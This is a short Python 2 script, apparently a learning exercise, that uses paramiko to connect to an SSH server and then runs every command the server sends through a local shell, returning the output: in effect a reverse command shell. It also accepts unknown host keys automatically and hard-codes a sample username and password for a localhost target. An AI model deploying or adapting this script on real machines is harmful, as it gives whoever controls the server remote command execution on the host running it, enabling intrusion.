#!/bin/python

import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):

    client = paramiko.SSHClient()

    # uncomment to enable key authentication for SSH
    #client.load_host_keys('/home/<username>/.ssh/known_hosts')

    # automatically accept unknown RSA keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(ip, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:

        ssh_session.send(command)
        print(ssh_session.recv(1024))

        while 1:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))

        client.close()



ssh_command('127.0.0.1', 'justin', 'lovesthepython', 'ClientConnected')
